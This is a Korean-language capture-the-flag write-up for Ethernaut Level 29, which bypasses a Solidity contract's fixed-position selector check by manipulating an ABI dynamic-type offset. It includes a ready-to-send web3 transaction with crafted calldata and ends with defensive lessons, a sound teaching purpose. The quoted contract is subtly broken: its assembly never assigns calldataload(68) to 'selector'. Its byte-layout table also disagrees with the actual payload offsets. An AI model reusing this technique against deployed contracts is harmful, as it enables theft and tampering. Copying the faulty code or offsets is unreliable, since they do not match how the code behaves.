# Ethernaut Level 29 - Switch

## 문제 설명

`flipSwitch()` 함수의 calldata offset 조작을 통해 스위치를 켜는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract Switch {
    bool public switchOn;
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyOff() {
        bytes32 selector;
        assembly {
            calldataload(68)  // ← calldata의 고정 위치(68)만 확인
        }
        require(selector == offSelector, "Only off");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOff() public { switchOn = false; }
    function turnSwitchOn() public { switchOn = true; }
}
```

---

## 취약점 분석

### calldata 구조 (표준)

`flipSwitch(bytes)` 정상 calldata:

```
[0:4]   flipSwitch() 시그니처
[4:36]  bytes offset = 0x20 (32)
[36:68] bytes length
[68:72] bytes 내용 (selector 4 bytes)
```

modifier는 **offset 68에서 고정으로** selector를 읽는다.

### calldata offset 조작

ABI 인코딩에서 동적 타입의 `offset`은 **데이터 실제 위치를 가리키는 포인터**다.

offset을 조작해 실제 데이터를 뒤쪽으로 밀면:
- offset 68 위치에는 `turnSwitchOff()` 시그니처 배치 → modifier 통과
- 실제 `_data`는 더 뒤에 `turnSwitchOn()` 시그니처 배치 → 실제 실행

---

## 조작된 calldata 구성

```
[0:4]   30c13ade  flipSwitch() 시그니처
[4:36]  0000...60  offset = 0x60 (96) ← 데이터 위치를 뒤로 이동
[36:68] 0000...00  padding
[68:72] 20606e15  turnSwitchOff() 시그니처 ← modifier 체크 통과
[72:96] 0000...00  padding
[96:128] 0000...04  length = 4
[128:]  76227e12  turnSwitchOn() 시그니처 ← 실제 실행
```

---

## 공격 단계

### Step 1 — 조작된 calldata 전송

```js
await web3.eth.sendTransaction({
    from: player,
    to: contract.address,
    data:
        "0x30c13ade" +                                                  // flipSwitch()
        "0000000000000000000000000000000000000000000000000000000000000060" + // offset = 96
        "0000000000000000000000000000000000000000000000000000000000000000" + // padding
        "20606e1500000000000000000000000000000000000000000000000000000000" + // turnSwitchOff() + padding
        "0000000000000000000000000000000000000000000000000000000000000004" + // length = 4
        "76227e1200000000000000000000000000000000000000000000000000000000"   // turnSwitchOn() + padding
})
```

### Step 2 — 확인

```js
await contract.switchOn()
// → true
```

---

## 핵심 교훈

- ABI 인코딩에서 동적 타입의 offset은 조작 가능
- calldata의 고정 위치만 검증하는 로직은 우회 가능
- raw calldata를 다룰 때는 ABI 디코딩을 통한 정확한 파싱 필요
- 인라인 어셈블리로 calldata를 읽을 때 offset 검증 필수
